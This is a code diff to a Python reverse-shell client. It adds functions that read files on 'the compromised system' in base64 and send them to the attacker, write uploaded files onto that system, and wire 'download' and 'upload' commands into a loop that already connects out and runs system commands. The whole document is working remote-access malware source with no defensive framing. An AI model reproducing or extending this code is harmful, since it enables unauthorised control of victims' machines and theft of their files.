@@ -10,6 +10,7 @@
 import os
 import json
 import socket
+import base64 
 import subprocess
 
 """ 
@@ -35,7 +36,7 @@ def establish_connection(ip, port):
     connection.connect((ip, port))
 
     user = get_user()
-    success_message = "IP: {} | User:{}".format(ip, user)
+    success_message = "IP: {} | User: {}".format(ip, user)
     send_data(connection, success_message)
 
     return connection
@@ -92,7 +93,43 @@ def execute_system_command(command):
 """
 def change_working_directory(path):
     os.chdir(path)
-    return "Working directory changed to {}.".format(os.getcwd()) 
+    return "Working directory changed to {}".format(os.getcwd()) 
+
+""" 
+* Function Name:  read_file()
+* Input:          path (string): Path to the file to download from the compromised system.            
+* Output:         data (string): base64 encoded content of the file.
+* Logic:          The function is used to read the contents of a file in base64 format inorder to send it to the attacker.
+* Example Call:   data = read_file("test.txt")
+"""
+def read_file(path):
+    try:
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read()).decode('utf-8')
+
+    except FileNotFoundError:
+        return "Error: File does not exist. Please verify the path again."
+
+""" 
+* Function Name:  write_file()
+* Input:          path (string): Path to where the file should be written to in the compromised system.
+*                 data (string): Data to be written to the file.
+* Output:         result (string): Message telling whether the writing of file was successful or unsuccessful.
+* Logic:          The function is used to decode and write the base64 encoded data onto a file in the compromised system. 
+* Example Call:   result = write_file("./", "sGetxalWFa...")
+"""
+def write_file(path, data):
+    try:
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(data))
+
+        return "File uploaded SUCCESSFULLY."
+
+    except:
+        if(path[-1] == "/"):
+            return "Invalid Destination PATH. Please add the file name along with the destination PATH."
+        else:
+            return "Invalid Destination PATH. Please verify the destination path and try again."
 
 """ 
 * Function Name:  communicate()
@@ -110,6 +147,16 @@ def communicate(connection):
 
         elif((command[0] == "cd") and (len(command) > 1)):
             result = change_working_directory(command[1])
+            send_data(connection, result)
+
+        elif(command[0] == "download"):
+            file_data = read_file(command[1])
+            send_data(connection, file_data)
+
+        elif(command[0] == "upload"):
+            path = command[2] if(len(command) > 3) else command[1]
+            data = command[3] if(len(command) > 3) else command[2]
+            result = write_file(path, data)
             send_data(connection, result)
 
         else:
